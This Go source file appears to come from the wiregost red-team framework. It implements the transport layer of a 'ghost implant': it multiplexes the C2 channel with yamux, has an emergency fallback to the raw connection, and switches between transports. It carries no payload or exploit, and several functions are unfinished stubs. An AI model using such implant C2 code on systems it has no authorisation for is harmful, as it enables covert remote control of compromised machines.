package transport

import (
	"crypto/rand"
	"encoding/binary"
	"io"
	"net"
	"sync"

	"github.com/hashicorp/yamux"
	"github.com/maxlandon/wiregost/ghost/log"
	"github.com/maxlandon/wiregost/ghost/rpc"
	"github.com/maxlandon/wiregost/ghost/security"
	tpb "github.com/maxlandon/wiregost/proto/v1/gen/go/transport"
)

var (
	// Transports - All transports usable by this ghost implant for Transports communications
	Transports = &transports{
		Active: &transport{},
		Ready:  &map[uint64]*transport{},
		mutex:  &sync.RWMutex{},
	}

	tpLog = log.GhostLog("transport", "transports")
)

// Transport - Any transport mechanism that implements this interface is considered good to use as a C2 transport for this
// ghost implant. Functionality set might vary per implementation, but we perform various checks when using them in any way.
type Transport interface {
	Info() tpb.Transport
	Type() tpb.Type
	Start() error
	Close() error
	Multiplex() bool
	CloseMux()
}

// transport - A transport mechanism for this ghost implant. This object might be embedded transport subtypes for
// each necessary protocol. Thus, all will share a common infrastructure and base functionality set.
// NOTE: A transport is obviously and necessarily a physical connection.
// The logical connection used for C2 requests/responses (muxed) is nonetheless owned by this transport.
type transport struct {
	Info        *tpb.Transport     // Information
	Ready       bool               // This is a check, in case the connection is just out of a switch and not yet working.
	Conn        net.Conn           // Physical connection, which might/will be muxed. We might need access from time to time.
	C2          io.ReadWriteCloser // Logical connection used for C2 requests/responses (muxed), on top of the Conn.
	Multiplexer *yamux.Session     // We generate multiple streams out of the physical one, for implant channels and routing.
	ClosedMux   chan struct{}      // Used to notify the routing multiplexer routine that it needs to stop.
}

// Setup - Takes care of boilerplate logging, multiplexing, adding RPC C2 code to the
// implant's main channel, and adds the transport to the Transport list.
func (t *transport) Setup() (err error) {

	tpLog.Infof("Starting transport (ID: %d)", t.Info.ID)
	tpLog.Infof("Protocol: %s", t.Info.Protocol.String())
	tpLog.Infof("Address: %s:%d", t.Info.RHost, t.Info.LPort)

	// Add job to channels, or just to a list for tracking current routines.

	// Setup multiplexer
	t.Multiplexer, err = yamux.Server(t.Conn, yamux.DefaultConfig())
	if err != nil {
		tpLog.Errorf("Failed to set a mux session around transport conn: %s", err.Error())
	}

	// Get a stream dedicated to implant C2 requests/responses. The server received
	// or registration/connection request, and will soon try to initiate a mux.
	if t.Multiplexer != nil {
		t.C2, err = t.Multiplexer.Open()
		if err != nil || t.C2 == nil {
			tpLog.Errorf("Failed to get C2 muxed stream: %s", err.Error())
			t.emergencyConnSetup()
		}
		err = rpc.SetupStreamRPC(t.C2)
	}

	Transports.Active = t // This transport is now the active one for this implant.

	tpLog.Infof("Successfully started transport (ID: %d)", t.Info.ID)

	return
}

// Stop - Stops either a listener or a live connection
func (t *transport) Stop() (err error) {

	tpLog.Infof("Stopping transport (ID: %d)", t.Info.ID)

	// Check routed connections. We need to devise how permissions
	// determine if a user can cutoff/switch a transport.

	// Also, we need to close all chans and any code using these streams, such as the RPC layer

	// We have sent a request to the server already, so that all muxed conns should be stopped,
	// and we can safely close the Main channel C2, as well as the multiplexer

	// Then we close the physical connection, last.

	// Remove job if stored somewhere

	return
}

// emergencyConnSetup - In the event of a critical failure, like a failed multiplexer operation,
// we fall back on using the physical conn, if possible, as a C2 stream for core implant comm.
// We will be at least able to forward the errors before crashing in the darkness of the world.
func (t *transport) emergencyConnSetup() {
	tpLog.Warnf("Falling back to the emergency C2 setup, around Transport physical conn")
	if t.Conn == nil {
		tpLog.Errorf("Transport physical conn is nil: no way to solve this.")
		security.Exit()
	}

	t.C2 = t.Conn
	tpLog.Infof("Physical transport conn is now used as implant C2 stream.")
	return
}

// transports - Holds all C2 transport protocols used by the implant.
type transports struct {
	Active *transport
	Ready  *map[uint64]*transport
	mutex  *sync.RWMutex
}

// Switch - Change the active transport for this ghost
func (tp *transports) Switch(to *tpb.Transport) (err error) {

	tpLog.Warnf("Switching transport stack for implant")
	tp.mutex.Lock()

	// Start new one.
	// Makes two working simultaneously, but if there is some
	// remote logging it's better to send it via the old conn.
	new := (*tp.Ready)[uint64(to.ID)]
	err = new.Setup() // We have to change this to Start()
	if err != nil {
		// Log the error (should be about multiplexer)
		// this will be forwarded to the server by the log system.
		return
	}

	// We send a request to the server, notifying the implant is ready,
	// multiplexer, RPC code, etc.

	// Stop old transport
	if tp.Active != nil {
		err = (*tp.Active).Stop()
		if err != nil {
			// Do something here, like send an abort message, via old transport
		}
	}

	// Make officialy new transport as active, and usable by other components
	tp.Active = new

	tp.mutex.Unlock()

	return
}

// Add - User requested to add a transport, with option to use it now
func (tp *transports) Add(new *tpb.Transport, use bool) (err error) {

	t := &transport{
		Info:  new,
		Ready: false,
	}

	tp.mutex.Lock()
	(*tp.Ready)[NewID()] = t
	tp.mutex.Unlock()

	if use {
		return tp.Switch(new)
	}

	return
}

// Remove - User requested to remove a transport from the list.
func (tp *transports) Remove(new *tpb.Transport, use bool) (err error) {
	return
}

// NewID - Generate random ID of randomIDSize bytes
func NewID() uint64 {
	randBuf := make([]byte, 8) // 64 bytes of randomness
	rand.Read(randBuf)
	return binary.LittleEndian.Uint64(randBuf)
}
